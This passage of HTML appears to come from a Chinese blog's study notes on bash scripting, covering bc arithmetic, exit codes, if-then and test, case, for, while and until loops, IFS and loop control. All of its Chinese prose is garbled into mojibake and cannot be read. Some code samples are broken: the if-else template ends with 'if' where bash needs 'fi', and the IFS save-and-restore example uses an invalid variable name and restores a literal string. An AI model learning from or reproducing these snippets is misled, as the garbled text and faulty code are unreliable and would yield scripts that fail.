æä¾›äº†å®Œæ•´çš„æµ®ç‚¹è¿ç®—ã€‚</p><h3 id="11-7-3-æµ®ç‚¹è§£å†³æ–¹æ¡ˆ"><a href="#11-7-3-æµ®ç‚¹è§£å†³æ–¹æ¡ˆ" class="headerlink" title="11.7.3 æµ®ç‚¹è§£å†³æ–¹æ¡ˆ"></a>11.7.3 æµ®ç‚¹è§£å†³æ–¹æ¡ˆ</h3><p>ä½¿ç”¨bashå†…å»ºçš„è®¡ç®—å™¨bc.</p><p>å¯ä»¥åœ¨shellæç¤ºç¬¦ä¸‹é€šè¿‡<code>bc</code>å‘½ä»¤è®¿é—®bashè®¡ç®—å™¨.</p><p>æµ®ç‚¹è¿ç®—æ˜¯ç”±å†…å»ºå˜é‡<code>scale</code>æ§åˆ¶ï¼Œç”¨äºè®¾ç½®ä½ å¸Œæœ›åœ¨è®¡ç®—ç»“æœä¸­ä¿ç•™çš„å°æ•°ä½æ•°.</p><p>ä½¿ç”¨<code>-q</code>å‘½ä»¤è¡Œé€‰é¡¹å¯ä»¥ä¸æ˜¾ç¤ºbashè®¡ç®—å™¨çš„æ¬¢è¿ä¿¡æ¯.</p><h4 id="åœ¨è„šæœ¬ä¸­ä½¿ç”¨bc"><a href="#åœ¨è„šæœ¬ä¸­ä½¿ç”¨bc" class="headerlink" title="åœ¨è„šæœ¬ä¸­ä½¿ç”¨bc"></a>åœ¨è„šæœ¬ä¸­ä½¿ç”¨bc</h4><p>å˜é‡åä¼¼ä¹ä¸èƒ½æ˜¯å¤§å†™å­—æ¯.</p><p>åˆ©ç”¨å‘½ä»¤æ›¿æ¢, åŸºæœ¬æ ¼å¼å¦‚ä¸‹:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">variable=<span class="hljs-constructor">$(<span class="hljs-params">echo</span> <span class="hljs-string">&quot;options; expression&quot;</span> | <span class="hljs-params">bc</span>)</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨é‚£è”è¾“å…¥é‡å®šå‘(inline input redirection), éœ€æŒ‡å®šä¸€ä¸ªæ–‡æœ¬æ ‡è®°æ¥åˆ’åˆ†è¾“å…¥æ•°æ®çš„å¼€å§‹å’Œç»“å°¾ï¼Œæ–‡æœ¬æ ‡è®°å¯ä»¥ä¸ºä»»æ„å­—ç¬¦ä¸²:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &lt;&lt; <span class="hljs-string">marker</span><br><span class="hljs-string">data</span><br><span class="hljs-string">marker</span><br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">variable=$(bc &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">options</span><br><span class="hljs-string">statements</span><br><span class="hljs-string">expressions</span><br><span class="hljs-string">EOF</span><br>)<br></code></pre></td></tr></table></figure><p>åœ¨bashè®¡ç®—å™¨ä¸­åˆ›å»ºçš„å˜é‡åªåœ¨bashè®¡ç®—å…¶ä¸­æœ‰æ•ˆï¼Œä¸èƒ½åœ¨shellè„šæœ¬ä¸­ä½¿ç”¨.</p><p>è®¡ç®—å¹‚å‡½æ•°:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ bc<br>power=10^10<br></code></pre></td></tr></table></figure><p>å¼€æ ¹å·:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ bc<br>result=sqrt(10^10)<br></code></pre></td></tr></table></figure><h2 id="11-8-é€€å‡ºè„šæœ¬"><a href="#11-8-é€€å‡ºè„šæœ¬" class="headerlink" title="11.8 é€€å‡ºè„šæœ¬"></a>11.8 é€€å‡ºè„šæœ¬</h2><p>é€€å‡ºçŠ¶æ€ç (exit status)ï¼Œä¸€ä¸ª0ï½255çš„æ•´æ•°å€¼.</p><h3 id="11-8-1-æŸ¥çœ‹é€€å‡ºçŠ¶æ€ç "><a href="#11-8-1-æŸ¥çœ‹é€€å‡ºçŠ¶æ€ç " class="headerlink" title="11.8.1 æŸ¥çœ‹é€€å‡ºçŠ¶æ€ç "></a>11.8.1 æŸ¥çœ‹é€€å‡ºçŠ¶æ€ç </h3><p>å˜é‡<code>$?</code>æ¥ä¿å­˜ä¸Šä¸ªå·²æ‰§è¡Œå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç .</p><p>æˆåŠŸç»“æŸçš„å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç æ˜¯0.</p><p>æ— æ•ˆå‘½ä»¤ä¼šè¿”å›ä¸€ä¸ªexit statusä¸º127.</p><p>exit statusä¸º126è¡¨ç¤ºç”¨æˆ·æ²¡æœ‰æ‰§è¡Œå‘½ä»¤çš„æ­£ç¡®æƒé™ã€‚</p><h3 id="11-8-2-exitå‘½ä»¤"><a href="#11-8-2-exitå‘½ä»¤" class="headerlink" title="11.8.2 exitå‘½ä»¤"></a>11.8.2 exitå‘½ä»¤</h3><p>æŒ‡å®šexit statusé€€å‡º.</p><h1 id="ç¬¬12ç« -ä½¿ç”¨ç»“æ„åŒ–å‘½ä»¤"><a href="#ç¬¬12ç« -ä½¿ç”¨ç»“æ„åŒ–å‘½ä»¤" class="headerlink" title="ç¬¬12ç«  ä½¿ç”¨ç»“æ„åŒ–å‘½ä»¤"></a>ç¬¬12ç«  ä½¿ç”¨ç»“æ„åŒ–å‘½ä»¤</h1><h2 id="12-1-ä½¿ç”¨if-thenè¯­å¥"><a href="#12-1-ä½¿ç”¨if-thenè¯­å¥" class="headerlink" title="12.1 ä½¿ç”¨if-thenè¯­å¥"></a>12.1 ä½¿ç”¨if-thenè¯­å¥</h2><p>æ ¼å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span> <br>    <span class="hljs-built_in">command</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>if</code>åé¢<code>command</code>çš„exit status, æ˜¯0, åˆ™æ‰§è¡Œ.</p><p><code>then</code>éƒ¨åˆ†å¯ä»¥æœ‰å¤šæ¡å‘½ä»¤.</p><h2 id="12-2-if-then-elseè¯­å¥"><a href="#12-2-if-then-elseè¯­å¥" class="headerlink" title="12.2 if-then-elseè¯­å¥"></a>12.2 if-then-elseè¯­å¥</h2><p>æ ¼å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">command</span><br><span class="hljs-keyword">else</span> <br>    <span class="hljs-built_in">command</span><br><span class="hljs-keyword">if</span><br></code></pre></td></tr></table></figure><p><code>else</code>éƒ¨åˆ†ä¹Ÿå¯ä»¥åŒ…å«å¤šæ¡å‘½ä»¤.</p><h2 id="12-3-åµŒå¥—if"><a href="#12-3-åµŒå¥—if" class="headerlink" title="12.3 åµŒå¥—if"></a>12.3 åµŒå¥—if</h2><p>ä½¿ç”¨åµŒå¥—çš„<code>if-then</code>è¯­å¥.</p><p>ä½¿ç”¨<code>elif</code>è¯­å¥:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span><br>   commands<br><span class="hljs-keyword">elif</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">then</span> <br>   commands<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="12-4-test-å‘½ä»¤"><a href="#12-4-test-å‘½ä»¤" class="headerlink" title="12.4 test å‘½ä»¤"></a>12.4 test å‘½ä»¤</h2><p>è¿ç”¨<code>test</code>å‘½ä»¤é€šè¿‡<code>if-then</code>è¯­å¥æµ‹è¯•å…¶ä»–æ¡ä»¶.</p><p>å¦‚æœ<code>test</code>å‘½ä»¤ä¸­åˆ—å‡ºçš„æ¡ä»¶æˆç«‹ï¼Œ<code>test</code>å‘½ä»¤å°±ä¼šé€€å‡ºå¹¶è¿”å›exit status 0.</p><p>æ ¼å¼:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>condition<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> condition<br><span class="hljs-keyword">then</span><br>   commands<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä¸å†™testå‘½ä»¤çš„<code>condition</code>éƒ¨åˆ†ï¼Œå®ƒä¼šä»¥éé›¶çš„é€€å‡ºçŠ¶æ€ç é€€å‡ºï¼Œå¹¶æ‰§è¡Œelseè¯­å¥å¿«.</p><p>å¯ä»¥ç”¨testå‘½ä»¤ç¡®å®šå˜é‡ä¸­æ˜¯å¦æœ‰å†…å®¹.</p><p>å¦ä¸€ç§æµ‹è¯•æ–¹æ³•ï¼Œä¸éœ€ç”¨testå‘½ä»¤:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span><span class="hljs-meta"> [ condition ]</span><br><span class="hljs-attribute">then</span><br>   <span class="hljs-attribute">commands</span><br><span class="hljs-attribute">fi</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ç¬¬ä¸€ä¸ªæ–¹æ‹¬å·ä¹‹åå’Œç¬¬äºŒä¸ªæ–¹æ‹¬å·ä¹‹å‰å¿…é¡»åŠ ä¸Šä¸€ä¸ªç©ºæ ¼.</p><p>testå‘½ä»¤å¯ä»¥åˆ¤æ–­ä¸‰ç±»æ¡ä»¶:</p><pre><code class="hljs">1. æ•°å€¼æ¯”è¾ƒ2. å­—ç¬¦ä¸²æ¯”è¾ƒ3. æ–‡ä»¶æ¯”è¾ƒ</code></pre><h3 id="12-4-1-æ•°å€¼æ¯”è¾ƒ"><a href="#12-4-1-æ•°å€¼æ¯”è¾ƒ" class="headerlink" title="12.4.1 æ•°å€¼æ¯”è¾ƒ"></a>12.4.1 æ•°å€¼æ¯”è¾ƒ</h3><p>ä¸èƒ½åœ¨testå‘½ä»¤ä¸­ä½¿ç”¨æµ®ç‚¹å€¼ã€‚</p><h3 id="12-4-2-å­—ç¬¦ä¸²æ¯”è¾ƒ"><a href="#12-4-2-å­—ç¬¦ä¸²æ¯”è¾ƒ" class="headerlink" title="12.4.2 å­—ç¬¦ä¸²æ¯”è¾ƒ"></a>12.4.2 å­—ç¬¦ä¸²æ¯”è¾ƒ</h3><pre><code class="hljs">1. æ¯”è¾ƒæ—¶å¤§äºå·å’Œå°äºå·å¿…é¡»è½¬ä¹‰ã€‚2. å¤§äºå’Œå°äºé¡ºåºå’Œsortå‘½ä»¤é‡‡å–çš„ä¸åŒã€‚æ¯”è¾ƒä½¿ç”¨çš„æ˜¯ASCIIé¡ºåº, å°å†™å¤§äºå¤§å†™ã€‚sortå‘½ä»¤ä½¿ç”¨çš„æ˜¯æœ¬åœ°è‹±è¯­ï¼Œå°å†™å­—æ¯å‡ºç°åœ¨å¤§å†™å­—æ¯ä¹‹å‰.</code></pre><p>ä½¿ç”¨<code>-n</code>å’Œ<code>-z</code>å‚æ•°æ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦å«æœ‰æ•°æ®:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> [ -n <span class="hljs-variable">$var1</span> ]<br></code></pre></td></tr></table></figure><p>ç©ºçš„å’Œæœªåˆå§‹åŒ–çš„å˜é‡ä¼šå¯¹shellè„šæœ¬æµ‹è¯•é€ æˆç¾éš¾æ€§çš„å½±å“.</p><h3 id="12-4-3-æ–‡ä»¶æ¯”è¾ƒ"><a href="#12-4-3-æ–‡ä»¶æ¯”è¾ƒ" class="headerlink" title="12.4.3 æ–‡ä»¶æ¯”è¾ƒ"></a>12.4.3 æ–‡ä»¶æ¯”è¾ƒ</h3><p>æµ‹è¯•Linuxæ–‡ä»¶ç³»ç»Ÿä¸Šæ–‡ä»¶å’Œç›®å½•çš„çŠ¶æ€.</p><p>è¿˜æ˜¯ä½¿ç”¨å‚æ•°æ¯”è¾ƒ.</p><h2 id="12-5-å¤åˆæ¡ä»¶æµ‹è¯•"><a href="#12-5-å¤åˆæ¡ä»¶æµ‹è¯•" class="headerlink" title="12.5 å¤åˆæ¡ä»¶æµ‹è¯•"></a>12.5 å¤åˆæ¡ä»¶æµ‹è¯•</h2><p>æœ‰ä¸¤ç§å¸ƒå°”è¿ç®—ç¬¦å¯ç”¨:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">[ co<span class="hljs-symbol">ndition1</span> ] || [ co<span class="hljs-symbol">ndition2</span> ]<br>[ co<span class="hljs-symbol">ndition1</span> ] &amp;&amp; [ co<span class="hljs-symbol">ndition2</span> ]<br></code></pre></td></tr></table></figure><h2 id="12-6-if-then-çš„é«˜çº§ç‰¹æ€§"><a href="#12-6-if-then-çš„é«˜çº§ç‰¹æ€§" class="headerlink" title="12.6 if-then çš„é«˜çº§ç‰¹æ€§"></a>12.6 if-then çš„é«˜çº§ç‰¹æ€§</h2><p>bash shell æä¾›äº†ä¸¤é¡¹å¯åœ¨ if-then è¯­å¥ä¸­ä½¿ç”¨çš„é«˜çº§ç‰¹æ€§:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ç”¨äºæ•°å­¦è¡¨è¾¾å¼çš„åŒæ‹¬å·<br><span class="hljs-bullet">2.</span> ç”¨äºé«˜çº§å­—ç¬¦ä¸²å¤„ç†åŠŸèƒ½çš„åŒæ–¹æ‹¬å·<br></code></pre></td></tr></table></figure><h3 id="12-6-1-ä½¿ç”¨åŒæ‹¬å·"><a href="#12-6-1-ä½¿ç”¨åŒæ‹¬å·" class="headerlink" title="12.6.1 ä½¿ç”¨åŒæ‹¬å·"></a>12.6.1 ä½¿ç”¨åŒæ‹¬å·</h3><p>æ ¼å¼:</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(( expression ))<br></code></pre></td></tr></table></figure><p>ä¸éœ€è¦å°†åŒæ‹¬å·ä¸­è¡¨è¾¾å¼é‡Œçš„å¤§äºå·è½¬ä¹‰ã€‚</p><h3 id="12-6-2-ä½¿ç”¨åŒæ–¹æ‹¬å·"><a href="#12-6-2-ä½¿ç”¨åŒæ–¹æ‹¬å·" class="headerlink" title="12.6.2 ä½¿ç”¨åŒæ–¹æ‹¬å·"></a>12.6.2 ä½¿ç”¨åŒæ–¹æ‹¬å·</h3><p>æ ¼å¼:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-string">[[ expression ]]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>expression</code>ä½¿ç”¨äº†testå‘½ä»¤ä¸­çš„æ ‡å‡†å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œä½†å®ƒæä¾›äº†æ¨¡å¼åŒ¹é… pattern matching.</p><p>è¿™é‡Œç”¨åŒç­‰å·<code>==</code>å…¶å³ä¾§ä¸ºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼.</p><h2 id="12-7-case-å‘½ä»¤"><a href="#12-7-case-å‘½ä»¤" class="headerlink" title="12.7 case å‘½ä»¤"></a>12.7 case å‘½ä»¤</h2><p>case å‘½ä»¤é‡‡ç”¨åˆ—è¡¨æ ¼å¼æ¥æ£€æŸ¥å•ä¸ªå˜é‡çš„å¤šä¸ªå€¼ã€‚</p><p>æ ¼å¼ï¼š</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">case <span class="hljs-keyword">variable</span> in <br>pattern1 | <span class="hljs-comment">pattern2) command1</span>;;<br>pattern3) command2;;<br><span class="hljs-comment">*) default command3;;</span><br>esac<br></code></pre></td></tr></table></figure><p>case å‘½ä»¤ä¼šå°†æŒ‡å®šçš„å˜é‡ä¸ä¸åŒæ¨¡å¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå˜é‡å’Œæ¨¡å¼æ˜¯åŒ¹é…çš„ï¼Œé‚£ä¹ˆshellä¼šæ‰§è¡Œè¯¥æ¨¡å¼æŒ‡å®šçš„å‘½ä»¤.</p><h1 id="13-æ›´å¤šçš„ç»“æ„åŒ–å‘½ä»¤"><a href="#13-æ›´å¤šçš„ç»“æ„åŒ–å‘½ä»¤" class="headerlink" title="13 æ›´å¤šçš„ç»“æ„åŒ–å‘½ä»¤"></a>13 æ›´å¤šçš„ç»“æ„åŒ–å‘½ä»¤</h1><h2 id="13-1-for-å‘½ä»¤"><a href="#13-1-for-å‘½ä»¤" class="headerlink" title="13.1 for å‘½ä»¤"></a>13.1 for å‘½ä»¤</h2><p>æ ¼å¼:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">for</span> <span class="hljs-keyword">var</span> <span class="hljs-keyword">in</span> list <br><span class="hljs-keyword">do</span><br>    commands<br>done<br></code></pre></td></tr></table></figure><h3 id="13-1-2-è¯»å–åˆ—è¡¨ä¸­çš„å¤æ‚å€¼"><a href="#13-1-2-è¯»å–åˆ—è¡¨ä¸­çš„å¤æ‚å€¼" class="headerlink" title="13.1.2 è¯»å–åˆ—è¡¨ä¸­çš„å¤æ‚å€¼"></a>13.1.2 è¯»å–åˆ—è¡¨ä¸­çš„å¤æ‚å€¼</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ä½¿ç”¨è½¬ä¹‰å­—ç¬¦æ¥å°†å•å¼•å·è½¬ä¹‰<br><span class="hljs-bullet">2.</span> ä½¿ç”¨åŒå¼•å·æ¥å®šä¹‰ç”¨åˆ°å•å¼•å·çš„å€¼<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> I don<span class="hljs-string">\&#x27;t</span> know <span class="hljs-literal">it</span> <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;this&#x27;ll&quot;</span> work<br></code></pre></td></tr></table></figure><p>åœ¨æŸä¸ªå€¼çš„ä¸¤è¾¹ä½¿ç”¨åŒå¼•å·æ—¶ï¼Œshellå¹¶ä¸ä¼šå°†åŒå¼•å·å½“æˆå€¼çš„ä¸€éƒ¨åˆ†.</p><h3 id="13-1-3-ä»å˜é‡è¯»å–åˆ—è¡¨"><a href="#13-1-3-ä»å˜é‡è¯»å–åˆ—è¡¨" class="headerlink" title="13.1.3 ä»å˜é‡è¯»å–åˆ—è¡¨"></a>13.1.3 ä»å˜é‡è¯»å–åˆ—è¡¨</h3><h3 id="13-1-4-ä»å‘½ä»¤è¯»å–å€¼"><a href="#13-1-4-ä»å‘½ä»¤è¯»å–å€¼" class="headerlink" title="13.1.4 ä»å‘½ä»¤è¯»å–å€¼"></a>13.1.4 ä»å‘½ä»¤è¯»å–å€¼</h3><h3 id="13-1-5-æ›´æ”¹å­—æ®µåˆ†éš”ç¬¦"><a href="#13-1-5-æ›´æ”¹å­—æ®µåˆ†éš”ç¬¦" class="headerlink" title="13.1.5 æ›´æ”¹å­—æ®µåˆ†éš”ç¬¦"></a>13.1.5 æ›´æ”¹å­—æ®µåˆ†éš”ç¬¦</h3><p>ç¯å¢ƒå˜é‡<code>IFS</code>, Internal Field Separator. å®šä¹‰äº†bash shell ç”¨ä½œå­—æ®µåˆ†éš”ç¬¦çš„ä¸€ç³»åˆ—å­—ç¬¦.</p><p>é»˜è®¤ä¸º:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">ç©ºæ ¼<br>åˆ¶è¡¨ç¬¦<br>æ¢è¡Œç¬¦<br></code></pre></td></tr></table></figure><p>æ›´æ”¹ä¸ºåªè¯†åˆ«æ¢è¡Œç¬¦:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">IFS</span>=$<span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ”¹å˜IFSä¹‹å‰ä¿å­˜åŸæ¥çš„IFSå€¼:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">IFS.<span class="hljs-attribute">OLD</span>=<span class="hljs-variable">$IFS</span><br><span class="hljs-attribute">IFS</span>=$&#x27;\n&#x27;<br><span class="hljs-built_in">..</span>.<br><span class="hljs-attribute">IFS</span>=IFS.OLD<br></code></pre></td></tr></table></figure><p>æŒ‡å®šå¤šä¸ªå­—ç¬¦:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">IFS</span>=$<span class="hljs-string">&#x27;\n&#x27;</span>:<span class="hljs-comment">;&quot;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¸²èµ·æ¥.</p><h2 id="13-2-Cè¯­è¨€é£æ ¼çš„forå‘½ä»¤"><a href="#13-2-Cè¯­è¨€é£æ ¼çš„forå‘½ä»¤" class="headerlink" title="13.2 Cè¯­è¨€é£æ ¼çš„forå‘½ä»¤"></a>13.2 Cè¯­è¨€é£æ ¼çš„forå‘½ä»¤</h2><p>å’ŒCè¯­è¨€é£æ ¼çš„ç±»ä¼¼ï¼Œä½†æœ‰ä¸€äº›ç»†å¾®çš„ä¸åŒ, åŸºæœ¬æ ¼å¼:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">for <span class="hljs-comment">(( variable assignment ; condition ; iteration process )</span>)<br><span class="hljs-keyword">do</span><br>... <br><span class="hljs-keyword">do</span><span class="hljs-symbol">ne</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰éµå¾ªbash shellæ ‡å‡†çš„forå‘½ä»¤:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å˜é‡èµ‹å€¼å¯ä»¥æœ‰ç©ºæ ¼<br><span class="hljs-bullet">2.</span> æ¡ä»¶ä¸­å˜é‡ä¸ä»¥ç¾å…ƒç¬¦å¼€å¤´<br><span class="hljs-bullet">3.</span> è¿­ä»£è¿‡ç¨‹çš„ç®—å¼æœªç”¨exprå‘½ä»¤æ ¼å¼<br></code></pre></td></tr></table></figure><h2 id="13-3-while-å‘½ä»¤"><a href="#13-3-while-å‘½ä»¤" class="headerlink" title="13.3 while å‘½ä»¤"></a>13.3 while å‘½ä»¤</h2><p>æ ¼å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-built_in">test</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">do</span><br>  other commmand<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="13-3-2-å®šä¹‰å¤šä¸ªæµ‹è¯•å‘½ä»¤"><a href="#13-3-2-å®šä¹‰å¤šä¸ªæµ‹è¯•å‘½ä»¤" class="headerlink" title="13.3.2 å®šä¹‰å¤šä¸ªæµ‹è¯•å‘½ä»¤"></a>13.3.2 å®šä¹‰å¤šä¸ªæµ‹è¯•å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$var1</span><br>       [ <span class="hljs-variable">$var1</span> -ge 0 ]<br></code></pre></td></tr></table></figure><p>åªæœ‰æœ€åä¸€ä¸ªæµ‹è¯•å‘½ä»¤çš„exit statusç”¨æ¥å†³å®šé€€å‡º.</p><p>æ¯ä¸ªæµ‹è¯•å‘½ä»¤éƒ½å‡ºç°åœ¨å•ç‹¬çš„ä¸€è¡Œã€‚</p><p>åœ¨æ¯æ¬¡è¿­ä»£ä¸­æ‰€æœ‰çš„æµ‹è¯•å‘½ä»¤éƒ½ä¼šè¢«æ‰§è¡Œ, åŒ…æ‹¬æµ‹è¯•å‘½ä»¤å¤±è´¥çš„é‚£ä¸€æ¬¡è¿­ä»£ï¼Œå…¶æµ‹è¯•æ¡ä»¶ä¾ç„¶ä¼šå…¨éƒ¨æ‰§è¡Œ.</p><h2 id="13-4-until-å‘½ä»¤"><a href="#13-4-until-å‘½ä»¤" class="headerlink" title="13.4 until å‘½ä»¤"></a>13.4 until å‘½ä»¤</h2><p>åªæœ‰æµ‹è¯•å‘½ä»¤çš„exit statusä¸ä¸º0, bash shellæ‰ä¼šæ‰§è¡Œå¾ªç¯å†…çš„å‘½ä»¤ï¼Œå…¶å·¥ä½œæ¨¡å¼å’Œwhileç›¸å, å³æµ‹è¯•æ¡ä»¶æˆåŠŸæ—¶é€€å‡º.</p><p>æ ¼å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">until <span class="hljs-built_in">test</span> <span class="hljs-built_in">command</span><br><span class="hljs-keyword">do</span><br>  other commands<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="13-7-æ§åˆ¶å¾ªç¯"><a href="#13-7-æ§åˆ¶å¾ªç¯" class="headerlink" title="13.7 æ§åˆ¶å¾ªç¯"></a>13.7 æ§åˆ¶å¾ªç¯</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">break</span>, ç»ˆæ­¢æŸå±‚å¾ªç¯<br><span class="hljs-keyword">continue</span>, ç»ˆæ­¢æŸæ¬¡å¾ªç¯<br></code></pre></td></tr></table></figure><p>ç‰¹æ®Šç”¨æ³•:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">break</span> n<br></code></pre></td></tr></table></figure><p>næŒ‡å®šäº†è¦è·³å‡ºçš„å¾ªç¯å±‚çº§, é»˜è®¤æƒ…å†µä¸‹nä¸º1.</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">continue</span> n<br></code></pre></td></tr></table></figure><h2 id="13-8-å¤„ç†å¾ªç¯çš„è¾“å‡º"><a href="#13-8-å¤„ç†å¾ªç¯çš„è¾“å‡º" class="headerlink" title="13.8 å¤„ç†å¾ªç¯çš„è¾“å‡º"></a>13.8 å¤„ç†å¾ªç¯çš„è¾“å‡º</h2><p>é€šè¿‡åœ¨doneå‘½ä»¤ä¹‹åæ·»åŠ ä¸€ä¸ªå¤„ç†å‘½ä»¤å®ç°:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 